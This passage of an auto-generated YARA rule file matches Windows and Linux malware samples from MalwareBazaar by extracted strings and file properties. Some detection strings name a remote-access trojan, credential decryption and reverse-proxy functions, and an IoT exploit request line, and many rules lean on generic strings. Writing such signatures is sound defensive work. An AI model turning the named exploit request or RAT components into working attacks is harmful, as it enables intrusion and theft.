        $s18 = "File too large"
        $s19 = "Read-only file system"
        $s20 = "File name too long"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB and
        all of them
}

rule Windows_4c7690aae75b181a414129672bbad75d30883ac9f59ccede66b3b5789bd105b6
{
    meta:
        description = "Auto ML: 4c7690aae75b181a414129672bbad75d30883ac9f59ccede66b3b5789bd105b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System.Core"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Reflection"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "Unrotted.exe"
        $s14 = "<Module>"
        $s15 = "SchemaReaderSql"
        $s16 = "UserExt"
        $s17 = "ProcessFileHandle"
        $s18 = "SYSTEM_HANDLE_INFORMATION"
        $s19 = "FileMapProtection"
        $s20 = "FileMapAccess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB and
        all of them
}

rule Windows_061e29f834b607e0f56113f3318890231346ac04a7fe24673989e10261fe55e1
{
    meta:
        description = "Auto ML: 061e29f834b607e0f56113f3318890231346ac04a7fe24673989e10261fe55e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_uNZD"
        $s6 = "get_ImagenURL"
        $s7 = "set_ImagenURL"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 543KB and
        all of them
}

rule Windows_4c91634a53fddb78f1737e66c0c323cdbc8d2e720a14732b8336e449ce062319
{
    meta:
        description = "Auto ML: 4c91634a53fddb78f1737e66c0c323cdbc8d2e720a14732b8336e449ce062319"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "E  To add or remove a member, edit your .resx file then rerun MSBuild."
        $s6 = "B  Overrides the current thread's CurrentUICulture property for all"
        $s7 = "dMSB3464: The TargetPath parameter must be specified if the target directory needs to be overwritten."
        $s8 = "TMSB3463: The TargetPath parameter must be specified if the application is updatable."
        $s9 = "EMSB3001: Cannot extract culture information from file name \"{0}\". {1}"
        $s10 = ",Culture of \"{0}\" was assigned to file \"{1}\"."
        $s11 = "<MSB3656: No input file has been passed to the task, exiting."
        $s12 = "AMSB3646: Cannot specify values for both KeyFile and KeyContainer."
        $s13 = "SMSB3647: DelaySign parameter is true, but no KeyFile or KeyContainer was specified."
        $s14 = "SMSB3649: The KeyFile path '{0}' is invalid. KeyFile must point to an existing file."
        $s15 = "gMSB3650: Neither SDKToolsPath '{0}' nor ToolPath '{1}' is a valid directory.  One of these must be set."
        $s16 = "GMSB3652: The key file '{0}' does not contain a public/private key pair."
        $s17 = "MSB3654: Delay signing requires that at least a public key be specified.  Please either supply a public key using the KeyFile or KeyContainer properties, or disable delay signing."
        $s18 = "sMSB3653: AxTlbBaseTask is not an executable task. If deriving from it, please ensure the ToolName property was set."
        $s19 = "kMSB3752: The \"{0}\" attribute has been set but is empty. If the \"{0}\" attribute is set it must not be empty."
        $s20 = "uMSB3755: Could not find reference \"{0}\". If this reference is required by your code, you may get compilation errors.\""
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB and
        all of them
}

rule Windows_4ca78845358393b899b27ea95fa11d04daa66763a2764dc8547230399cd41931
{
    meta:
        description = "Auto ML: 4ca78845358393b899b27ea95fa11d04daa66763a2764dc8547230399cd41931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "uzSet"
        $s3 = "sEtp"
        $s4 = "CMDh"
        $s5 = "WInN"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 5888KB and
        all of them
}

rule Windows_4cb94e5cf28dc29ec74d5171838ec3735632812576708ec1bf1654b87b18215e
{
    meta:
        description = "Auto ML: 4cb94e5cf28dc29ec74d5171838ec3735632812576708ec1bf1654b87b18215e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "Connector color."
        $s6 = "KAn activity with Activation set to 'True' must not be inside loop activity."
        $s7 = "PAn activity with Activation set to 'True' must be the first executable activity."
        $s8 = "Operation cannot be completed since the request context cannot be signaled at this time. Make sure workflow is not unloaded between synchronous request response operation."
        $s9 = "yCorrelation value specified does not match the already initialized correlation value on declaration {0} for activity {1}."
        $s10 = "'Correlation '{0}' is already specified."
        $s11 = "MThere is already an activity with name '{0}'.  Activity names must be unique."
        $s12 = "CompositeActivity '{0}' status is currently '{1}'. Dynamic modifications are allowed only when the activity status is 'Initialized' or 'Closed'."
        $s13 = "CompositeActivity '{0}' status is currently '{1}'. Workflow changes are allowed only when the activity status is 'Initialized' or 'Closed'."
        $s14 = "uThe target workflow must not have an activity that implements an WebServiceInputActivity with Activation set to True."
        $s15 = "_An instance of ExternalDataExchangeService of type {0} already exists in the runtime container."
        $s16 = "$Could not start the target workflow."
        $s17 = "CWorkflow definition for invoked workflow '{0}' could not be loaded."
        $s18 = "`The workflow instance received the web service request but unloaded before sending the response."
        $s19 = ":Activity '{0}' does not have CorrelationToken property set"
        $s20 = "2Cannot find property '{0}' on the target activity."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 850KB and
        all of them
}

rule Linux_4cd40c12ab3331ac8adf456285a6106a93e1dee1870c7330b343003cb1c97ebe
{
    meta:
        description = "Auto ML: 4cd40c12ab3331ac8adf456285a6106a93e1dee1870c7330b343003cb1c97ebe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB and
        all of them
}

rule Windows_4d18c76bb688c0e0e5988c174d8cea453421b051c6c565ffe381c9537516cd30
{
    meta:
        description = "Auto ML: 4d18c76bb688c0e0e5988c174d8cea453421b051c6c565ffe381c9537516cd30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "KERNEL32.DLL"
        $s6 = "ADVAPI32.dll"
        $s7 = "MSVCRT.dll"
        $s8 = "PSAPI.DLL"
        $s9 = "SHELL32.dll"
        $s10 = "SHLWAPI.dll"
        $s11 = "USER32.dll"
        $s12 = "WININET.dll"
        $s13 = "DisableThreadLibraryCalls"
        $s14 = "GetCurrentThreadId"
        $s15 = "DeleteCriticalSection"
        $s16 = "CreateEventA"
        $s17 = "CloseHandle"
        $s18 = "ResetEvent"
        $s19 = "SetEvent"
        $s20 = "GetFileAttributesA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2144KB and
        all of them
}

rule Windows_4d49c61647576d71405df122d55a461940ae46c11da96380ba1c6e5e042060bf
{
    meta:
        description = "Auto ML: 4d49c61647576d71405df122d55a461940ae46c11da96380ba1c6e5e042060bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "cmdqcsorsljvarbdgjcgncwavtvucdzvfiwbprwshfgxaafoedmyukeovwubstjzmcxgjosndtjhxuuznmzkylcsrdbx"
        $s6 = "attempts."
        $s7 = "You are getting closer."
        $s8 = "You are very close!"
        $s9 = "attempts. The correct number was"
        $s10 = "ios_base::badbit set"
        $s11 = "ios_base::failbit set"
        $s12 = "ios_base::eofbit set"
        $s13 = "already connected"
        $s14 = "bad file descriptor"
        $s15 = "connection aborted"
        $s16 = "connection already in progress"
        $s17 = "connection refused"
        $s18 = "connection reset"
        $s19 = "file exists"
        $s20 = "file too large"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB and
        all of them
}

rule Linux_4da1443a2e9fbc8b88ef8d6653142568c586ddbeaa2dedeb743ca9cec3eb0552
{
    meta:
        description = "Auto ML: 4da1443a2e9fbc8b88ef8d6653142568c586ddbeaa2dedeb743ca9cec3eb0552"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1."
        $s2 = "User-"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Windows_4e01c76200fe5e4cde437fdd12b42c9d2c884018b7f9b89e097ff53ee4e75ec9
{
    meta:
        description = "Auto ML: 4e01c76200fe5e4cde437fdd12b42c9d2c884018b7f9b89e097ff53ee4e75ec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_4e0bbc36f494616d41b54f5c393ea04cc854645bde88cee145fbd58874f1b06c
{
    meta:
        description = "Auto ML: 4e0bbc36f494616d41b54f5c393ea04cc854645bde88cee145fbd58874f1b06c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB and
        all of them
}

rule Windows_4e531e34c8132457b497653d69f5efe16c95a651aa0a47e8ab8f56ad1f35b51d
{
    meta:
        description = "Auto ML: 4e531e34c8132457b497653d69f5efe16c95a651aa0a47e8ab8f56ad1f35b51d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "loadingCircle1"
        $s5 = "openFileDialog1"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "get_SelectedTab"
        $s9 = "setPathDoc"
        $s10 = "add_Load"
        $s11 = "frmSelPath_Load"
        $s12 = "frmMain_Load"
        $s13 = "set_RotationSpeed"
        $s14 = "get_Enabled"
        $s15 = "set_Enabled"
        $s16 = "get_Cancelled"
        $s17 = "add_FormClosed"
        $s18 = "frmLoading_FormClosed"
        $s19 = "frmMain_FormClosed"
        $s20 = "get_HasExited"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 704KB and
        all of them
}

rule Windows_061e427df3c58f2e4bd71c45494e5cb20786c2e5c40ff2f95df7f83475cba89a
{
    meta:
        description = "Auto ML: 061e427df3c58f2e4bd71c45494e5cb20786c2e5c40ff2f95df7f83475cba89a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadInt32"
        $s5 = "WindowsFormsApplication16"
        $s6 = "<Module>"
        $s7 = "get_hCAB"
        $s8 = "System.IO"
        $s9 = "get_Data"
        $s10 = "GetData"
        $s11 = "get_Magenta"
        $s12 = "Form1_Load"
        $s13 = "add_Load"
        $s14 = "set_Enabled"
        $s15 = "set_AutoCompleteSource"
        $s16 = "get_KeyCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_AutoCompleteMode"
        $s19 = "set_AutoSizeMode"
        $s20 = "set_ColumnHeadersHeightSizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 646KB and
        all of them
}

rule Windows_4e58387e1431f77f2fb4f103f82f7e5703daa02e039e352f05384c2ea300d103
{
    meta:
        description = "Auto ML: 4e58387e1431f77f2fb4f103f82f7e5703daa02e039e352f05384c2ea300d103"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "SeTF,"
        $s6 = "CorExitProcess"
        $s7 = "FlsSetValue"
        $s8 = "FlsGetValue"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "`local static thread guard'"
        $s17 = "`placement delete[] closure'"
        $s18 = "`placement delete closure'"
        $s19 = "delete[]"
        $s20 = "delete"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 352KB and
        all of them
}

rule Windows_4e5eed42429be79e4a35d0e137149356319debf7e20ec9a8ca744564ddd95f43
{
    meta:
        description = "Auto ML: 4e5eed42429be79e4a35d0e137149356319debf7e20ec9a8ca744564ddd95f43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "Q>&sETh"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "GAIsProcessorFeaturePresent"
        $s17 = "KERNEL32"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB and
        all of them
}

rule Windows_4e77b03fc9937ac68121e3121cf062ba0994ba4aa06d2ccde468ce2a91cda61f
{
    meta:
        description = "Auto ML: 4e77b03fc9937ac68121e3121cf062ba0994ba4aa06d2ccde468ce2a91cda61f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "SetFileSecurityW"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCreateKeyExW"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationW"
        $s17 = "SHGetFileInfoW"
        $s18 = "SHGetPathFromIDListW"
        $s19 = "ShellExecuteExW"
        $s20 = "SHGetSpecialFolderLocation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 440KB and
        all of them
}

rule Windows_4e90cbff460414a9bd5b8ba2c9680bca2f85d3a38b4d2b2242f8c176d102f72f
{
    meta:
        description = "Auto ML: 4e90cbff460414a9bd5b8ba2c9680bca2f85d3a38b4d2b2242f8c176d102f72f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB and
        all of them
}

rule Windows_4eabb95ac9e86f96dfc6489a64b98b736189c100f9328210e18197ac89b1e63d
{
    meta:
        description = "Auto ML: 4eabb95ac9e86f96dfc6489a64b98b736189c100f9328210e18197ac89b1e63d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Sooor.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "GetString"
        $s8 = "ModuleHandle"
        $s9 = "System.Collections.Generic"
        $s10 = "System.Management"
        $s11 = "System.Reflection"
        $s12 = "CreateMemberRefsDelegates"
        $s13 = "CreateGetStringDelegate"
        $s14 = "System.Security"
        $s15 = "System.Runtime.CompilerServices"
        $s16 = "AssemblyFileVersionAttribute"
        $s17 = "AttributeTargets"
        $s18 = "get_Scheme"
        $s19 = "WriteLine"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 16040KB and
        all of them
}

rule Windows_4ec0dc97a22820f4d65d46424b991f5a8d84db9272d76a9801f5c31d299d42f3
{
    meta:
        description = "Auto ML: 4ec0dc97a22820f4d65d46424b991f5a8d84db9272d76a9801f5c31d299d42f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteSelectedNodes>b__50_0"
        $s5 = "<GetInputs>b__66_0"
        $s6 = "<get_OutputSocket>b__17_0"
        $s7 = "<GetOutputs>b__67_0"
        $s8 = "<get_InputSocket>b__19_0"
        $s9 = "<GetNodes>b__0"
        $s10 = "<DeleteSelectedNodes>b__50_1"
        $s11 = "get_Panel1"
        $s12 = "ReadInt32"
        $s13 = "<DeleteSelectedNodes>b__50_2"
        $s14 = "get_Panel2"
        $s15 = "<DeleteSelectedNodes>b__3"
        $s16 = "<DeleteSelectedNodes>b__50_4"
        $s17 = "<Module>"
        $s18 = "System.Drawing.Drawing2D"
        $s19 = "System.IO"
        $s20 = "GetObjectData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 672KB and
        all of them
}

rule Windows_4efc9ad66b0d09b4e5ddae9e2c02bd112cb6e8cb7e9881969f231a10768b558f
{
    meta:
        description = "Auto ML: 4efc9ad66b0d09b4e5ddae9e2c02bd112cb6e8cb7e9881969f231a10768b558f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "System.Data"
        $s7 = "Load"
        $s8 = "set_Enabled"
        $s9 = "get_DataSource"
        $s10 = "set_DataSource"
        $s11 = "set_AutoScaleMode"
        $s12 = "set_ColumnHeadersHeightSizeMode"
        $s13 = "get_IdLotFabricatie"
        $s14 = "set_IdLotFabricatie"
        $s15 = "get_UnitateMasuraMateriale"
        $s16 = "set_UnitateMasuraMateriale"
        $s17 = "get_NumeMateriale"
        $s18 = "set_NumeMateriale"
        $s19 = "get_NrMateriale"
        $s20 = "set_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 937KB and
        all of them
}

rule Linux_4f0cceb59f469fb50bfbac4d269501407702bf8ac0c25fdce883cbbb1528b4e9
{
    meta:
        description = "Auto ML: 4f0cceb59f469fb50bfbac4d269501407702bf8ac0c25fdce883cbbb1528b4e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB and
        all of them
}

rule Windows_4f1aa26efeafe6c4e92f7f15548fab6f23c42250d36c683cb5fa5bcfd4b8c751
{
    meta:
        description = "Auto ML: 4f1aa26efeafe6c4e92f7f15548fab6f23c42250d36c683cb5fa5bcfd4b8c751"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4759KB and
        all of them
}

rule Windows_4f2139c9c1c42e293388deb00bcb9591162b58c8107e6cd8a317b40f93a6c836
{
    meta:
        description = "Auto ML: 4f2139c9c1c42e293388deb00bcb9591162b58c8107e6cd8a317b40f93a6c836"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "AssemblyKeyFileAttribute"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "ofvV.exe"
        $s14 = "<Module>"
        $s15 = "System.Windows.Forms"
        $s16 = "Settings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "<Module>{F02CFE8D-3D71-4DB3-96D0-2ADE1704BEEC}"
        $s20 = "System.ComponentModel"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 860KB and
        all of them
}

rule Linux_06206d8fb1ad3ffe39a98aa38f0bf424b5fd774e848b8417fb2e8d9be6cdbbb2
{
    meta:
        description = "Auto ML: 06206d8fb1ad3ffe39a98aa38f0bf424b5fd774e848b8417fb2e8d9be6cdbbb2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB and
        all of them
}

rule Windows_4f7a5d41b69c4b09f20a6a4d5113f51618f02f7ccf1393f931fdc34f99481b26
{
    meta:
        description = "Auto ML: 4f7a5d41b69c4b09f20a6a4d5113f51618f02f7ccf1393f931fdc34f99481b26"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "kernel32.dll"
        $s6 = "user32.dll"
        $s7 = "wininet.dll"
        $s8 = "Winhttp.dll"
        $s9 = "kernel32"
        $s10 = "shlwapi.dll"
        $s11 = "Kernel32.dll"
        $s12 = "GetCurrentProcessId"
        $s13 = "EnumWindows"
        $s14 = "IsWindowVisible"
        $s15 = "GetWindowThreadProcessId"
        $s16 = "GetWindowTextA"
        $s17 = "GetClassNameA"
        $s18 = "GetCurrentThreadId"
        $s19 = "OpenThread"
        $s20 = "CloseHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 896KB and
        all of them
}

rule Linux_4fa3d0afa237bc9278fe94334f06e60014a8e5dbabd3969a32b0cf8ceba1f765
{
    meta:
        description = "Auto ML: 4fa3d0afa237bc9278fe94334f06e60014a8e5dbabd3969a32b0cf8ceba1f765"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
